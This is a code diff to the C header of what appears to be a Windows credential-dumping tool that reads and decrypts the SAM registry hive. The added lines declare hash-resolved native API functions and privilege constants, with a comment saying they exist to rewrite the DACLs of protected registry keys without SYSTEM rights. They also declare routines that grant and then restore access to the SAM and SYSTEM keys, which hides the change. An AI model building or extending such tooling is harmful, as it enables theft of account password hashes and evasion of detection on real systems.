@@ -9,6 +9,7 @@
 #define MAX_KEY_VALUE_LENGTH 1000
 #define MAX_VALUE_NAME 16383+2
 #define MAX_SAM_ENTRIES 100
+#define MAX_SECURITY_LENGTH 1024
 #define STR_TO_KEY_LEN 8
 
 #define NtOpenKey_RFDT   0xB9491C52
@@ -22,6 +23,20 @@
 #define TpReleaseWork_RFDT       0x50595ADD
 #define RtlInitUnicodeString_RFDT        0xB1AFABD9
 #define ntdlldll_RFDT    0x8C6C8F3D
+#define NtOpenKeyEx_RFDT         0x3001822F
+#define RtlAdjustPrivilege_RFDT          0xDEBA8E59
+#define NtQuerySecurityObject_RFDT       0x96E803DC
+#define NtSetSecurityObject_RFDT         0xF62EC132
+#define RtlCreateSecurityDescriptor_RFDT         0xF825CFF2
+#define RtlSetDaclSecurityDescriptor_RFDT        0xDEDBA61E
+#define RtlSetOwnerSecurityDescriptor_RFDT       0xBBFE56F5
+#define RtlCreateAcl_RFDT        0x6E33604B
+#define RtlAddAccessAllowedAceEx_RFDT    0xFABD6950
+
+// Privileges required to rewrite the DACL of protected registry keys without SYSTEM rights
+#define SE_TAKE_OWNERSHIP_PRIVILEGE      9
+#define SE_RESTORE_PRIVILEGE     18
+#define SE_BACKUP_PRIVILEGE      17
 
 typedef FARPROC(WINAPI* myMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);
 
@@ -34,6 +49,16 @@ typedef NTSTATUS(WINAPI* myNtClose)(HANDLE);
 
 typedef VOID(WINAPI* myRtlInitUnicodeString)(PUNICODE_STRING, __drv_aliasesMem PCWSTR);
 
+typedef NTSTATUS(WINAPI* myNtOpenKeyEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG);
+typedef NTSTATUS(WINAPI* myRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+typedef NTSTATUS(WINAPI* myNtQuerySecurityObject)(HANDLE, SECURITY_INFORMATION, PSECURITY_DESCRIPTOR, ULONG, PULONG);
+typedef NTSTATUS(WINAPI* myNtSetSecurityObject)(HANDLE, SECURITY_INFORMATION, PSECURITY_DESCRIPTOR);
+typedef NTSTATUS(WINAPI* myRtlCreateSecurityDescriptor)(PSECURITY_DESCRIPTOR, ULONG);
+typedef NTSTATUS(WINAPI* myRtlSetDaclSecurityDescriptor)(PSECURITY_DESCRIPTOR, BOOLEAN, PACL, BOOLEAN);
+typedef NTSTATUS(WINAPI* myRtlSetOwnerSecurityDescriptor)(PSECURITY_DESCRIPTOR, PSID, BOOLEAN);
+typedef NTSTATUS(WINAPI* myRtlCreateAcl)(PACL, ULONG, ULONG);
+typedef NTSTATUS(WINAPI* myRtlAddAccessAllowedAceEx)(PACL, ULONG, ULONG, ACCESS_MASK, PSID);
+
 
 typedef struct _sam {
 	WCHAR rid[MAX_KEY_LENGTH];
@@ -43,6 +68,12 @@ typedef struct _sam {
 	ULONG fLen;
 	WCHAR classes[MAX_KEY_VALUE_LENGTH];
 } *PSAM, SAM;
+
+typedef struct _daclSave {
+	WCHAR regPath[MAX_KEY_LENGTH];                  // registry key path whose original security descriptor is saved
+	ULONG sdLength;                                 // length of the saved security descriptor
+	ULONG sd[MAX_SECURITY_LENGTH / sizeof(ULONG)];  // saved original owner + DACL
+} *PDACLSAVE, DACLSAVE;
 
 extern BOOL gDebugEnabled;
 
@@ -56,6 +87,8 @@ void DebugPrintWideLength(const CHAR* label, const WCHAR* value, ULONG charLengt
 void DebugPrintGuid(const CHAR* label, REFGUID guid);
 void getSAM(PSAM samRegEntries[], PULONG size);
 void getClasses(PSAM samRegEntry);
+void grantRegistryAccess(PDACLSAVE samSave, PDACLSAVE systemSave);
+void restoreRegistryAccess(PDACLSAVE samSave, PDACLSAVE systemSave);
 void getBootKey(PSAM samRegEntry, PBYTE bootKeyRet);
 void strToKey(PBYTE s, PBYTE keyRet);
 void decryptSAM(PSAM samRegEntries[], int entries);
